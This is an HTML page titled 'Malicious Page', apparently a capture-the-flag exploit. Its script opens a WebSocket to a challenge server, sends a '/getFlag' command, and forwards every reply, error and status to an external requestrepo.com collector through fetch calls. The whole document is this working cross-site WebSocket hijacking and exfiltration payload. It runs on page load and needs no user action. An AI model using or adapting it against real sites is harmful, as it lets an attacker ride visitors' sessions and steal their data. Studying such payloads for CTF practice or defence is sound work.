        <!DOCTYPE html>
<html>
<head>
  <title>Malicious Page</title>
</head>
<body>
  <h1>Loading...</h1>
  <script>
    try {
      // 创建 WebSocket 连接
      const ws = new WebSocket('wss://wembsoncket.chal.cyberjousting.com');
      
      // 连接打开时发送指令
      ws.onopen = function() {
        // 记录连接状态 (调试用)
        console.log("WebSocket connection established");
        // 向外部服务器发送连接成功通知
        fetch('https://4fz7yove.requestrepo.com/?status=websocket_connected');
        // 发送 getFlag 命令 (修正格式)
        ws.send(JSON.stringify({ message: '/getFlag' }));
      };
      
      // 接收消息时处理
      ws.onmessage = function(event) {
        console.log("Message received:", event.data);
        
        // 向外部服务器发送原始数据
        fetch('https://4fz7yove.requestrepo.com/?raw=' + encodeURIComponent(event.data));
        
        try {
          // 尝试解析 JSON
          const data = JSON.parse(event.data);
          // 检查各种可能的字段格式
          if (data.message) {
            fetch('https://4fz7yove.requestrepo.com/?message=' + encodeURIComponent(data.message));
          }
          if (data.sender) {
            fetch('https://4fz7yove.requestrepo.com/?sender=' + encodeURIComponent(data.sender));
          }
          // 发送整个数据对象
          fetch('https://4fz7yove.requestrepo.com/?data=' + encodeURIComponent(JSON.stringify(data)));
        } catch (e) {
          // 解析错误，发送错误信息
          fetch('https://4fz7yove.requestrepo.com/?parse_error=' + encodeURIComponent(e.message));
        }
      };
      
      // 错误处理
      ws.onerror = function(error) {
        console.error("WebSocket error:", error);
        fetch('https://4fz7yove.requestrepo.com/?ws_error=' + encodeURIComponent(JSON.stringify(error)));
      };
      
      // 连接关闭处理
      ws.onclose = function(event) {
        console.log("WebSocket connection closed:", event.code, event.reason);
        fetch('https://4fz7yove.requestrepo.com/?ws_closed=' + encodeURIComponent(JSON.stringify({code: event.code, reason: event.reason})));
      };
    } catch (e) {
      // 捕获所有其他错误
      console.error("General error:", e);
      fetch('https://4fz7yove.requestrepo.com/?error=' + encodeURIComponent(e.message));
    }
    
    // 确保页面立即发出连接信号
    fetch('https://4fz7yove.requestrepo.com/?page_loaded=true');
  </script>
</body>
